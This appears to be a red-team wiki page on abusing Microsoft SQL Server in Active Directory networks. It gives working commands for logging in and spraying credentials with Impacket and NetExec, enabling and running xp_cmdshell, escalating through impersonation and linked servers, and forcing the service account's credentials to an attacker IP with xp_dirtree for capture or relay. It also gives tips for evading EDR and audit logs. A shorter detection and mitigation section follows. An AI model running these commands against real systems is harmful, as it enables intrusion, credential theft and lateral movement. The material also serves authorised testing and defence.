---
title: "MSSQL abuse (xp_cmdshell, linked servers, UNC coercion)"
type: concept
created: 2026-09-07
updated: 2026-09-07
tags: [mssql, lateral-movement, coercion, privilege-escalation, credential-access]
---

# MSSQL abuse

Microsoft SQL Server is one of the richest **internal AD attack surfaces** and
routinely under-hunted. Three things make it valuable: MSSQL service accounts
have **SPNs** (`MSSQLSvc/...`) so they're **kerberoastable** and often run as
privileged domain accounts; a plain domain user is frequently a **valid SQL
login**; and SQL gives you **command execution** (`xp_cmdshell`), **an
impersonation graph** (`EXECUTE AS`, linked servers), and a **UNC-coercion
primitive** (`xp_dirtree`) that forces the SQL service account to authenticate to
you. This is the tradecraft page; the SPN/roasting angle ties to
[[kerberoasting]] and [[service-principal-name]].

## Getting in

```bash
# Impacket – Windows/Kerberos auth or SQL auth
mssqlclient.py corp.local/user:pass@sql01 -windows-auth
mssqlclient.py -k sql01.corp.local            # Kerberos ticket ($KRB5CCNAME)
mssqlclient.py sa:'SqlPass'@sql01             # local SQL 'sa'

# NetExec – find instances, spray, exec
nxc mssql 10.0.0.0/24 -u user -p pass                 # who can log in where
nxc mssql sql01 -u user -p pass -x whoami              # exec (auto-enables xp_cmdshell if sysadmin)
nxc mssql sql01 -u user -p pass -M mssql_priv          # impersonation / privesc check
```

Enumerate context first: `SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin');`
and the SQL SPNs from LDAP (`GetUserSPNs.py`, [[ad-enumeration]]) so you know
which instances exist and what account each runs as.

## Command execution

```sql
-- xp_cmdshell (needs sysadmin, or IMPERSONATE to one). Enable if off:
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';         -- runs as the SQL SERVICE account
```

Runs as the **service account** — if that's a domain account with rights
elsewhere, you've moved laterally / escalated. Alternatives when `xp_cmdshell`
is watched: **`sp_OACreate`** (OLE Automation), **CLR assemblies**
(`CREATE ASSEMBLY` → custom proc), or **Agent jobs**.

## Privilege escalation inside SQL

- **Impersonation** — if your login has `IMPERSONATE` on a higher one:
  `EXECUTE AS LOGIN = 'sa'; ... ; REVERT;` → sysadmin. `mssql_priv` /
  PowerUpSQL `Invoke-SQLAudit` finds these.
- **TRUSTWORTHY + db_owner** — a `TRUSTWORTHY ON` database where you own a DB
  lets you create a stored proc that escalates to sysadmin.
- **Stored-proc / trigger chaining** and over-privileged public roles.

## Linked servers (crawl the trust graph)

Linked servers let one instance run queries **on another as a configured login**.
Chained links form a graph you can walk — often from a low-value edge instance
into a **sysadmin context on a sensitive one**:

```sql
EXEC sp_linkedservers;                                  -- enumerate links
SELECT * FROM OPENQUERY([SQL02], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [SQL02];
```

PowerUpSQL `Get-SQLServerLinkCrawl` and **MSSQLPwner** automate the crawl
(including nested links and per-hop RPC-out exec).

## UNC coercion → relay / capture (the sleeper primitive)

Even a **low-priv** SQL login can make the SQL **service account** authenticate
to an attacker path — no exec, no sysadmin needed:

```sql
EXEC xp_dirtree   '\\10.10.10.10\share';   -- forces SMB auth from the service acct
EXEC xp_fileexist '\\10.10.10.10\share\x';
EXEC xp_subdirs   '\\10.10.10.10\share';
```

Point it at [[responder]] to **capture + crack** the service account's Net-NTLM,
or at `ntlmrelayx` to **relay** it — to LDAP for **RBCD**
([[resource-based-constrained-delegation]]), to AD CS for **ESC8** ([[esc8]]), or
to another host for exec. This is a top way to turn "I can log into the SQL box"
into domain movement — see [[ntlm-relay-coercion]].

## Forging your way in (silver ticket to MSSQL)

Once you hold the SQL **service account's** hash/AES key (roasted or dumped), you
can forge a **silver ticket** for the `MSSQLSvc/sql01:1433` SPN and log in as any
user — including a sysadmin — entirely offline. See
[[golden-silver-tickets]].

## Red-team notes (OPSEC)

- **`xp_dirtree` coercion is the quiet win** — it's a legitimate-looking stored
  proc call, generates no `sp_configure`/xp_cmdshell noise, and hands you the
  service account's Net-NTLM. Prefer it over flipping `xp_cmdshell` on a
  monitored instance.
- **Enabling `xp_cmdshell` is loud** (`sp_configure` + `RECONFIGURE` are audited);
  if it's already on, use it; if not, weigh CLR/OLE or coercion instead. Turn it
  back off if you flipped it.
- **`xp_cmdshell` spawns `cmd.exe`/your payload as a child of `sqlservr.exe`** —
  an unusual parent that EDR flags; consider CLR (in-process) for stealth.
- **Crawl links read-only first** (`SYSTEM_USER`, role checks) before executing —
  map where each hop lands you before you make noise.

## Detection

- **4688** with **parent `sqlservr.exe`** → `cmd.exe`/PowerShell = classic
  `xp_cmdshell`.
- **SQL audit / Extended Events**: `sp_configure` changes, `xp_cmdshell`,
  `EXECUTE AS`, `CREATE ASSEMBLY`, linked-server RPC.
- **Outbound SMB from the SQL host** to an unexpected IP right after a query =
  `xp_dirtree` coercion → correlate with **4624/4776** at the attacker and
  Net-NTLM capture.
- **Kerberoast** signature on the `MSSQLSvc` SPN (4769 RC4) — the roasting entry.
- Mitigations: least-privilege SQL logins, `xp_cmdshell` off + policy-locked,
  remove unused linked servers / use least-priv link logins, `TRUSTWORTHY OFF`,
  SMB signing + [[ad-tiering-and-hardening]] to blunt the relay.

## Links

- [[kerberoasting]] / [[service-principal-name]] — the `MSSQLSvc` SPN is roastable
- [[golden-silver-tickets]] — silver ticket to the MSSQL SPN
- [[ntlm-relay-coercion]] / [[responder]] — where `xp_dirtree` auth goes
- [[resource-based-constrained-delegation]] / [[esc8]] — relay targets
- [[remote-execution]] — turning SQL exec into a shell/beacon
- [[ad-enumeration]] — finding instances/SPNs; [[netexec]] / [[impacket]] tooling

## References

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [MSSQLPwner](https://github.com/ScorpionesLabs/MSSQLPwner)
- [Impacket mssqlclient.py](https://github.com/fortra/impacket)
